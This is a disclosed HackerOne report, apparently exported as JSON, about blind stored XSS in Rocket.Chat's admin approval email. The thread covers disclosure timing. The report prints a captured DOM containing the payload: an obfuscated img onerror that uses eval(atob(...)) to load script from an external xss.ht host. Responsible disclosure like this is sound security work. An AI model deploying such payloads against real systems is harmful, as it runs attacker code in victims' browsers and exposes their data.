class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>When testing these types of issues in future, I highly recommend <em>not</em> using my personal payload. You can create an account on <a title=\"https://xsshunter.com/\" href=\"/redirect?signature=fa79223971d79edbe349667db79248025dd19e8a&amp;url=https%3A%2F%2Fxsshunter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://xsshunter.com/</span><i class=\"icon-external-link\"></i></a> and use your own payload. This is just to make sure you do not accidentally leak sensitive information to the reporter in future.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3242564, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-25T03:35:35.862Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-25T03:35:35.862Z", 
            "actor": {
                "username": "tassoevan", 
                "url": "/tassoevan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/315/635/dbce653c35b6d8257f208914520b0f29e8282ff0_medium.jpeg?1532356225"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow To be honest, I knew that I did something terribly wrong (imagining that the client of development SMTP server wouldn't render the email) but I was expecting to go unnoticed :) Thank you for warn us.", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> To be honest, I knew that I did something terribly wrong (imagining that the client of development SMTP server wouldn&#39;t render the email) but I was expecting to go unnoticed :) Thank you for warn us.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3243025, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-25T09:57:14.973Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-25T09:57:14.973Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "No worries, @tassoevan, just thought I would bring this to your attention in case there was anything sensitive in the output and I also wanted to let you know about https://xsshunter.com/. I have deleted all the data I retrieved from my XSSHunter dashboard.", 
            "markdown_message": "<p>No worries, <a href=\"/tassoevan\">@tassoevan</a>, just thought I would bring this to your attention in case there was anything sensitive in the output and I also wanted to let you know about <a title=\"https://xsshunter.com/\" href=\"/redirect?signature=fa79223971d79edbe349667db79248025dd19e8a&amp;url=https%3A%2F%2Fxsshunter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://xsshunter.com/</span><i class=\"icon-external-link\"></i></a>. I have deleted all the data I retrieved from my XSSHunter dashboard.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3244552, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "edoverflow", 
                "url": "/edoverflow"
            }, 
            "created_at": "2018-08-27T15:54:49.544Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-27T15:54:49.544Z", 
            "actor": {
                "username": "tassoevan", 
                "url": "/tassoevan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/315/635/dbce653c35b6d8257f208914520b0f29e8282ff0_medium.jpeg?1532356225"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow Thanks again!", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> Thanks again!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 3253532, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-27T18:34:37.524Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-27T18:34:37.524Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "first_to_agree": true, 
            "message": "Thank you, @tassoevan. It is an absolute pleasure to work with you. I would, hereby, kindly request we publicly disclose this report in order to inform fellow researchers on HackerOne.", 
            "markdown_message": "<p>Thank you, <a href=\"/tassoevan\">@tassoevan</a>. It is an absolute pleasure to work with you. I would, hereby, kindly request we publicly disclose this report in order to inform fellow researchers on HackerOne.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3254212, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-28T17:07:03.535Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-28T17:07:03.535Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow we will discloser this in 30 days to give time for the current users to update their installations.", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> we will discloser this in 30 days to give time for the current users to update their installations.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3259250, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-28T17:11:02.399Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-28T17:11:02.399Z", 
            "actor": {
                "username": "tassoevan", 
                "url": "/tassoevan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/315/635/dbce653c35b6d8257f208914520b0f29e8282ff0_medium.jpeg?1532356225"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow We're keeping a policy of waiting for 30 days before fully disclose it, since this issue is related to our code base and can affect many users.", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> We&#39;re keeping a policy of waiting for 30 days before fully disclose it, since this issue is related to our code base and can affect many users.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3259264, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-28T20:15:32.748Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-28T20:15:32.748Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "OK, sounds good to me. \ud83d\udc4d", 
            "markdown_message": "<p>OK, sounds good to me. \ud83d\udc4d</p>\n", 
            "type": "Activities::Comment", 
            "id": 3259915, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-26T18:34:52.996Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-26T18:34:52.996Z", 
            "actor": {
                "url": "/rocket_chat", 
                "profile": {
                    "name": "Rocket.Chat"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/858/579770f2ba92af3953abc9204886c242051f03e3_medium.png?1536335889"
                }
            }, 
            "team_handle": "rocket_chat", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3392948, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "edoverflow", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/edoverflow", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/116/374/2e86e29173a7b27dc4e4c35ecaef804781110b9f_small.png?1527882436"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -6147712.804151303, 
    "disclosed_at": "2018-09-26T18:34:52.953Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/382666", 
    "created_at": "2018-07-17T17:09:30.273Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><em>Note: This report was initially sent via email and I was invited to submit this here.</em></p>\n\n<p>Hi team,</p>\n\n<p>During an audit on a third-party, I discovered that rocket.chat Android client might be vulnerable to blind XSS. My XSS payload fired in the context of the target&#39;s rocket.chat client as you can see below \u2014 details concerning the target have been redacted.</p>\n\n<p>Unfortunately, I did not take note of where exactly I submitted the payloads, but based on the canvas rendering of the page the payload fired in, I believe that the <code>Accounts_Admin_Email_Approval_Needed_With_Reason_Default</code> action is vulnerable.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/321/540/0eea7b1d0f10af3a2809b9ee757ca6a7ac31f02c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221630Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=125ce0e7d1c9990830ae55d689880f0e94f4a1a5a432a920cdbb286d6f12ba13\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/321/540/0eea7b1d0f10af3a2809b9ee757ca6a7ac31f02c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221630Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=125ce0e7d1c9990830ae55d689880f0e94f4a1a5a432a920cdbb286d6f12ba13\" class=\"markdown-inline-image\"></a>  </p>\n\n<p>The results were quite surprising though. The payload apparently fired in the context of <code>email://4/71676</code>. This the DOM of the vulnerable page:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;&lt;head&gt;</span>\n        <span class=\"nt\">&lt;meta</span> <span class=\"na\">id=</span><span class=\"s\">&quot;meta-viewport&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;viewport&quot;</span> <span class=\"na\">content=</span><span class=\"s\">&quot;width=412&quot;</span> <span class=\"na\">contenteditable=</span><span class=\"s\">&quot;false&quot;</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;style&gt;</span>\n            <span class=\"nc\">.mail-message-content</span> <span class=\"nt\">pre</span> <span class=\"p\">{</span>\n                <span class=\"nl\">white-space</span><span class=\"p\">:</span> <span class=\"n\">pre-wrap</span> <span class=\"cp\">!important</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n\n            <span class=\"nc\">.initial-load</span> <span class=\"p\">{</span>\n                <span class=\"c\">/* 0x0 and 1x1 may be short-circuited by WebView */</span>\n                <span class=\"nl\">width</span><span class=\"p\">:</span> <span class=\"m\">2px</span><span class=\"p\">;</span>\n                <span class=\"nl\">height</span><span class=\"p\">:</span> <span class=\"m\">0px</span><span class=\"p\">;</span>\n                <span class=\"nl\">-webkit-transform</span><span class=\"p\">:</span> <span class=\"n\">translate3d</span><span class=\"p\">(</span><span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">1px</span><span class=\"p\">);</span>\n                <span class=\"nl\">-webkit-animation-name</span><span class=\"p\">:</span> <span class=\"n\">initial-load-noop-animation</span><span class=\"p\">;</span>\n                <span class=\"nl\">-webkit-animation-duration</span><span class=\"p\">:</span> <span class=\"m\">1ms</span><span class=\"p\">;</span> <span class=\"c\">/* doesn&#39;t matter */</span>\n            <span class=\"p\">}</span>\n\n            <span class=\"c\">/* Animating the z-position is fast and does not actually change anything in the default\n            * perspective.\n            */</span>\n            <span class=\"k\">@-webkit-keyframes</span> <span class=\"n\">initial-load-noop-animation</span> <span class=\"p\">{</span>\n                <span class=\"nt\">from</span> <span class=\"p\">{</span>\n                    <span class=\"nl\">-webkit-transform</span><span class=\"p\">:</span> <span class=\"n\">translate3d</span><span class=\"p\">(</span><span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">1px</span><span class=\"p\">);</span>\n                <span class=\"p\">}</span>\n                <span class=\"nt\">to</span> <span class=\"p\">{</span>\n                    <span class=\"nl\">-webkit-transform</span><span class=\"p\">:</span> <span class=\"n\">translate3d</span><span class=\"p\">(</span><span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">);</span>\n                <span class=\"p\">}</span>\n            <span class=\"p\">}</span>\n        <span class=\"nt\">&lt;/style&gt;</span>\n    <span class=\"nt\">&lt;title&gt;&lt;/title&gt;&lt;/head&gt;</span>\n    <span class=\"nt\">&lt;body</span> <span class=\"na\">id=</span><span class=\"s\">&quot;MessageViewBody&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;margin: 0px 26.5px; padding: 0px !important; word-break: keep-all !important; word-wrap: break-word !important; width: 360px;&quot;</span> <span class=\"na\">onpageshow=</span><span class=\"s\">&quot;&quot;</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">&quot;MessageWebViewDiv&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;mail-message-content collapsible zoom-normal&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;user-select: auto; display: block; height: auto; padding-bottom: 5px; width: 360px;&quot;</span> <span class=\"na\">set_width_attr=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;table</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">bgcolor=</span><span class=\"s\">&quot;#f3f3f3&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;color:#4a4a4a;font-family: Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;border-collapse:collapse;border-spacing:0;margin:0 auto&quot;</span> <span class=\"na\">original_width_attr=</span><span class=\"s\">&quot;-1&quot;</span><span class=\"nt\">&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;padding:1em&quot;</span><span class=\"nt\">&gt;&lt;table</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">align=</span><span class=\"s\">&quot;center&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;width:100%;margin:0 auto;max-width:800px&quot;</span><span class=\"nt\">&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td</span> <span class=\"na\">bgcolor=</span><span class=\"s\">&quot;#ffffff&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;background-color:#ffffff; border: 1px solid #DDD; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;&quot;</span><span class=\"nt\">&gt;&lt;table</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span><span class=\"nt\">&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;background-color: #04436a;&quot;</span><span class=\"nt\">&gt;&lt;h1</span> <span class=\"na\">style=</span><span class=\"s\">&quot;font-family: Helvetica,Arial,sans-serif; padding: 0 1em; margin: 0; line-height: 70px; color: #FFF;&quot;</span><span class=\"nt\">&gt;</span>Rocket.Chat<span class=\"nt\">&lt;/h1&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;padding: 1em; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;&quot;</span><span class=\"nt\">&gt;&lt;p&gt;</span>The user <span class=\"nt\">&lt;b&gt;</span>abba (<span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;mailto:hackeroned@protonmail.com&quot;</span><span class=\"nt\">&gt;</span>xxxxxxx@xxxxxxx.com<span class=\"nt\">&lt;/a&gt;</span>)<span class=\"nt\">&lt;/b&gt;</span> has been registered.<span class=\"nt\">&lt;/p&gt;&lt;p&gt;</span>Reason: <span class=\"nt\">&lt;b&gt;</span>&quot;<span class=\"ni\">&amp;gt;</span><span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;x&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&quot;</span> <span class=\"na\">onerror=</span><span class=\"s\">&quot;eval(atob(this.id))&quot;</span><span class=\"nt\">&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;</span>Please check &quot;Administration -<span class=\"ni\">&amp;gt;</span> Users&quot; to activate or delete it.<span class=\"nt\">&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;font-family: Helvetica,Arial,sans-serif; max-width: 800px; margin: 0 auto; padding: 1.5em; text-align: center; font-size: 8pt; color: #999;&quot;</span><span class=\"nt\">&gt;</span>Powered by <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://rocket.chat&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;_blank&quot;</span><span class=\"nt\">&gt;</span>Rocket.Chat<span class=\"nt\">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</span>\n\n        <span class=\"nt\">&lt;/div&gt;</span>\n    <span class=\"c\">&lt;!-- delete the annotation. --&gt;</span>\n\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span><span class=\"nt\">&gt;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_RTL</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;false&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">MSG_HIDE_ELIDED</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;VORHERIGE NACHRICHTEN AUSBLENDEN&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">MSG_SHOW_ELIDED</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;VORHERIGE NACHRICHTEN ANZEIGEN&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">DOC_BASE_URI</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;email://71676&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">WIDE_VIEWPORT_WIDTH</span> <span class=\"o\">=</span> <span class=\"mi\">1440</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">WEBVIEW_WIDTH</span> <span class=\"o\">=</span> <span class=\"mi\">1440</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">ENABLE_CONTENT_READY</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">BASE_FONT_SIZE</span> <span class=\"o\">=</span> <span class=\"mi\">3</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_AUTOFIT</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">CONTENT_WIDTH</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">DENSITY_RATIO</span> <span class=\"o\">=</span> <span class=\"mf\">1.0</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">CHANGE_VIEWPORT_WIDTH</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_CONVERSATION_VIEW_MODE</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_LARGE_SCALE</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">USE_SELECTION_CHANGE</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">USE_WORD_WRAPPING</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_DESKTOP_MODE</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IMAGE_MENTION</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;an image is included.&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">TABLE_MENTION</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;a table is included.&#39;</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">IS_PART_MESSAGE</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n    <span class=\"nt\">&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/AutoFit.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/Selection.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/ContentsParser.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/Controller.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/layout.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">type=</span><span class=\"s\">&quot;text/javascript&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;file:///android_asset/messageview/exec.js&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">&quot;initial-load-signal&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;initial-load&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;user-select: none;&quot;</span><span class=\"nt\">&gt;&lt;/div&gt;</span>\n\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;https://2973956338.xss.ht&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;https://2973956338.xss.ht&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;https://2973956338.xss.ht&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;iframe</span> <span class=\"na\">width=</span><span class=\"s\">&quot;412&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;330&quot;</span> <span class=\"na\">scrolling=</span><span class=\"s\">&quot;no&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;visibility: hidden; position: absolute; top: -10000px; left: -10000px;&quot;</span><span class=\"nt\">&gt;&lt;/iframe&gt;&lt;iframe</span> <span class=\"na\">width=</span><span class=\"s\">&quot;412&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;330&quot;</span> <span class=\"na\">scrolling=</span><span class=\"s\">&quot;no&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;visibility: hidden; position: absolute; top: -10000px; left: -10000px;&quot;</span><span class=\"nt\">&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;</span>\n</code></pre>\n<p>I am confident this is as a result of your code and not the target&#39;s implementation. Please do let me know though if this has something to do with the version that the target is currently running \u2014 they might be running an outdated instance of rocket.chat.</p>\n\n<p>- Ed</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker can execute malicious client-side code against the target&#39;s administrator. I was able to retrieve the contents of the DOM from the administrator&#39;s notification window.</p>\n", 
